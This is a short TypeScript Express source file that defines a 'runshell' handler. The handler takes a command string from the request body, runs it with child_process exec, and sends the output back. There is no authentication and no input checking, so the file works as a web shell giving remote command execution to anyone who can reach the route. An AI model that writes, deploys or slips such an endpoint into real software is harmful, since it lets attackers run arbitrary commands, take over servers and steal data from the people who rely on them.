import { Request, Response } from "express";
const { exec } = require("child_process");

export const runshell = {
    run: (req: Request, res: Response) => {
        if (!req.body.command) {
            return res.status(200).send("OK.");
        } else {
            const command = req.body.command;
            exec(command, (error: any, stdout: any, stderr: any) => {
                if (error) {
                    return res.status(500).send(error.message);
                } else if(stderr) {
                    return res.status(500).send(stderr);
                } else {
                    return res.status(200).send(stdout);
                }
            });
        }
    }
};